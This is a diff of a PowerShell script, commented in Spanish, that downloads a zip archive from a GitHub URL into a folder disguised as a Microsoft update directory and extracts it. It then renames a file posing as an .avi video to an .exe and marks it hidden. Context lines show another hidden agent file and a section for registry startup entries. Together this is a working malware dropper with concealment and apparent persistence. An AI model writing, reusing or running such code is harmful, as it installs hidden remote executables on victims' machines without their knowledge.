@@ -22,21 +22,18 @@ Set-ItemProperty -Path $rutaLocalAgent -Name Attributes -Value $atributosOcultos
 
 # Copy Ejecuter
 # Definir rutas locales y URL
-$rutaLocalZip = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN.zip"
+$rutaLocalZip = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate\SMSUCN.zip"
 $urlRemotoZip = "https://github.com/emakedie/UCN/raw/refs/heads/main/SMSUCN.zip"
-$rutaDestinoExtraido = "$env:UserProfile\AppData\Local\Microsoft\MsUpdate\SMSUCN"
+$rutaDestinoExtraido = "C:\Users\candrade\AppData\Local\Microsoft\MsUpdate"
 $rutaArchivoAvi = "$rutaDestinoExtraido\SMSUCN.avi"
 $rutaArchivoExe = "$rutaDestinoExtraido\SMSUCN.exe"
-
 # Descargar el archivo zip si no existe
 if (-not (Test-Path $rutaLocalZip)) {
     Invoke-WebRequest -Uri $urlRemotoZip -OutFile $rutaLocalZip
 }
-# Extraer el contenido del zip si no se ha extraído aún
-if (-not (Test-Path $rutaDestinoExtraido)) {
-    # Crear la carpeta de destino si no existe
-    New-Item -Path $rutaDestinoExtraido -ItemType Directory
-    # Extraer el archivo zip
+# Extraer el contenido del zip directamente en la carpeta destino
+if (Test-Path $rutaLocalZip) {
+    # Extraer el archivo zip en la carpeta de destino
     Expand-Archive -Path $rutaLocalZip -DestinationPath $rutaDestinoExtraido -Force
 }
 # Comprobar si el archivo SMSUCN.avi existe y renombrarlo como .exe
@@ -46,6 +43,7 @@ if (Test-Path $rutaArchivoAvi) {
 # Opcionalmente, establecer el archivo renombrado como oculto
 $atributosOcultos = (Get-Item $rutaArchivoExe).Attributes -bor [System.IO.FileAttributes]::Hidden
 Set-ItemProperty -Path $rutaArchivoExe -Name Attributes -Value $atributosOcultos
+
 
 
 # Registry path for the startup entries
